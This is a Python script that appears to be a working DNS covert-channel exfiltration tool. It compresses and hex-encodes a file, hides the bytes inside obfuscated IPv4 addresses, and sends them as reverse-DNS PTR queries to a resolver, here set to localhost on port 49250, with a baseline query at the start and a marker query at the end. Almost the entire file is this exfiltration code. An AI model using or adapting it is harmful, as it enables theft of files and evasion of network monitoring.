from dns import resolver, reversename, message, query, name, rrset, rdataclass, rdatatype, flags, asyncquery
import random
import os
import zipfile
from math import floor

baseline = 0

def send_data(set_baseline=False,octets=[]):
    global baseline
    beginning_octet = ""
    if set_baseline:
        print("SENDING BASELINE")
        baseline = random.randrange(30,100)
        beginning_octet = "172"
        octets  = [random.randrange(0,255),random.randrange(0,255)]
        constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{baseline}"
    else:
        beginning_octet = ""
        for index in range(len(octets)):
            octets[index] = str(int(octets[index]) + baseline)
            if int(octets[index]) > 255:
                if len(beginning_octet) < 1:
                    beginning_octet+="2"
                else:
                    beginning_octet+=str(random.choice([x for x in range(2, 5, 2)]))
                octets[index] = str(int(octets[index]) - 255)
            else:
                if len(beginning_octet) < 1:
                    beginning_octet+="1"
                else:
                    beginning_octet+=str(random.choice([x for x in range(1, 4, 2)]))
            constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{octets[2]}"

    reverse_dns_dnspython(f"{constructed}")
   

def convert_to_ipv4(portion):
    ipv4_address_elements = []
    for byte in portion:
        ipv4_address_elements.append(str(int(byte,16)))

    send_data(set_baseline=False,octets=ipv4_address_elements)

def reverse_dns_dnspython(ip_address):
    req_name = reversename.from_address(ip_address)
    res = resolver.Resolver()
    res.nameservers = ['127.0.0.1']
    res.port = 49250
    res.timeout=0.1
    res.lifetime=0.1
    try:
        res.resolve(req_name, rdtype=rdatatype.PTR, rdclass=rdataclass.IN)
    except:
        pass

if __name__ == "__main__":
    increment = 0
    if os.path.isfile("recovered"):
        os.remove("recovered")

    if os.path.isfile("compressed.gz"):
        os.remove("compressed.gz")

    with zipfile.ZipFile("compressed.gz", mode="w", compression=zipfile.ZIP_DEFLATED,compresslevel=9) as archive:
        archive.write("test.py")

    with open("compressed.gz","rb") as f:
        data = f.read().hex()

    segmented = [data[i:i+2] for i in range(0, len(data), 2)]

    send_data(set_baseline=True)

    size_of_chunk = 3
    prior = 0
    print("[*] SENDING DATA")
    for index in range(0,len(segmented)):
        if index!=0 and index%size_of_chunk==0:
            portion = segmented[prior:index]
            prior = index
            convert_to_ipv4(portion)
            print(f"[*] {increment}/{floor(len(segmented)/3)}")
            increment+=1

    diff = len(segmented) - prior
    if (size_of_chunk-diff) >= 0:
        portion = segmented[prior:]
        for x in range(size_of_chunk-diff):
            portion.append('00')
        convert_to_ipv4(portion)
    
    print(f"[?] {size_of_chunk-diff} 00'S APPENDED TO END OF RECOVERED FILE FOR PADDING")
    octets  = [random.randrange(0,255),random.randrange(0,255),random.randrange(0,255)]
    reverse_dns_dnspython(f"104.{octets[0]}.{octets[1]}.{octets[2]}")
    print(f"[!] FINISHED SENDING DATA")